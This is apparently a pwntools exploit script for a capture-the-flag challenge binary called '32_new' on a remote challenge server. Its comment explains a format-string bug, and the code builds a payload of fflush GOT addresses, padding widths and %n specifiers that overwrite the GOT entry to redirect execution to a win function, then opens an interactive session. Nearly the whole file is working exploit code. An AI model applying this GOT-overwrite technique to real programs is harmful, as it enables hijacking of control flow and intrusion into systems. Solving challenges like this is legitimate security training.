#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './32_new'
elf = context.binary = ELF(exe, checksec=True)
# libc = './lib/libc.so.6'
 #libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()

""" 
the vulnerability lies in that line that calls a printf without specifying the format specifier. 
hence we could calculate the offset of the buffer in which our message is being stored from the 
top stack pointer and perform a GOT entry over-write of the fflush() function to ret2win. this 
could be achieved by storing the addresses of the GOT entry in the buffer and printing suitable 
number of blank spaces and call %n format specifier so that it overwrites the entry with the 
number of bytes printed by printf which would cause the instruction flow to ret2win the next time
fflush() is called. 
"""

#Print the first line of text
print(f"{r.recvline()}")

fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the amount of bytes needed to be printed in order to write correct value
flag_val0 = b"%185x"
flag_val1 = b"%892x"
flag_val2 = b"%129x"

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = b"%10$n"
fmt_string1 = b"%11$n"
fmt_string2 = b"%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2

#Send the payload
r.sendline(payload)

r.interactive()
